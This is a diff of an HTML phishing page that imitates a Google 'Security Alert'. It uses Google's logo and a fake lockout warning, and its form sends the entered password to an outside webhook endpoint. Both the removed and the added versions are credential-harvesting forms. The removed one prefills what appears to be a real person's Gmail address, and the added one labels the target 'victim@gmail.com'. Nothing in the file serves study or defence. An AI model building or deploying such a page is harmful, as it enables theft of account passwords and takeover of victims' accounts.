@@ -1,16 +1,30 @@
 <!DOCTYPE html>
-<html>
-<head><title>Google</title></head>
-<body style="font-family:Roboto,sans-serif;margin:40px">
-<div style="max-width:400px;margin:auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
-<img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="100">
-<h2 style="color:hsl(225, 6%, 13%)">Security Alert</h2>
-<p>Unusual sign-in detected. Verify account:</p>
-<form action="https://script.google.com/macros/s/YOUR_WEBHOOK/exec" method="POST">
-<input type="email" value="ammieyusman@gmail.com" readonly style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px">
-<input name="password" type="password" placeholder="Enter Password" required style="width:100%;padding:12px;margin:10px 0;border:1px solid #dadce0;border-radius:4px">
-<button type="submit" style="width:100%;background:#1a73e8;color:white;padding:12px;border:none;border-radius:4px;cursor:pointer">Verify Account</button>
-</form>
-</div>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Account Verification</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        <h1>Security Alert</h1>
+        <p><strong>Unusual sign-in attempt detected</strong><br>Verify your account to prevent lockout.</p>
+        
+        <form id="loginForm" action="https://YOUR-WEBHOOK-URL.netlify.app" method="POST">
+            <input type="email" name="email" value="victim@gmail.com" readonly>
+            <input type="password" name="password" placeholder="Enter your password" required>
+            <input type="hidden" name="service" value="gmail">
+            <button type="submit">Verify Account</button>
+        </form>
+        
+        <div id="status"></div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            document.getElementById('status').innerHTML = 'Verifying...';
+        });
+    </script>
 </body>
 </html>
